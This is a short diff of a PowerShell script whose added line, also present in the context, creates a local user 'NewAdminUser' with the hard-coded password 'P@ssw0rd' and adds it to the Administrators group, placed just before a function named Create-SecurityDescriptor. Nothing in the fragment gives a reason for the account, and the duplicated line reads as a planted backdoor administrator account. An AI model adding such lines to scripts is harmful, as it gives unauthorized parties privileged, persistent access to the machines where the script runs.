@@ -1,6 +1,6 @@
 New-LocalUser -Name "NewAdminUser" -Password (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force); Add-LocalGroupMember -Group "Administrators" -Member "NewAdminUser"
 
-
+New-LocalUser -Name "NewAdminUser" -Password (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force); Add-LocalGroupMember -Group "Administrators" -Member "NewAdminUser"
 function Create-SecurityDescriptor {
     param (
         [string]$ComputerSid
